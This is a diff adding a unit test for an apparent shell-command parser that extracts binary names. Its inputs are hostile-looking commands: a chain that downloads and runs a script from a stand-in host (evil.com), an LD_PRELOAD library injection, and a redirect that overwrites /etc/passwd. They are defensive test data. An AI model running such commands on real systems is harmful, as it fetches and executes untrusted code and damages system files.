@@ -87,3 +87,13 @@ def test_secret_masking():
     # The new aggressive masking replaces the token part including the Sk.
     assert "***MASKED***" in masked
     assert "12345678" not in masked
+
+def test_extract_binaries_redirection():
+    from main import extract_binaries
+    assert extract_binaries("ls >| /etc/passwd") == ["ls"]
+    assert extract_binaries("ls > /dev/null") == ["ls"]
+    assert extract_binaries("ls >/dev/null") == ["ls"]
+    assert extract_binaries("echo test; ls") == ["echo", "ls"]
+    assert extract_binaries("curl http://evil.com/script.sh -o myscript.sh; chmod +x myscript.sh; ./myscript.sh") == ["curl", "chmod", "myscript.sh"]
+    assert extract_binaries("LD_PRELOAD=/tmp/evil.so systemctl status") == ["systemctl"]
+    assert extract_binaries("cat < input.txt > output.txt") == ["cat"]
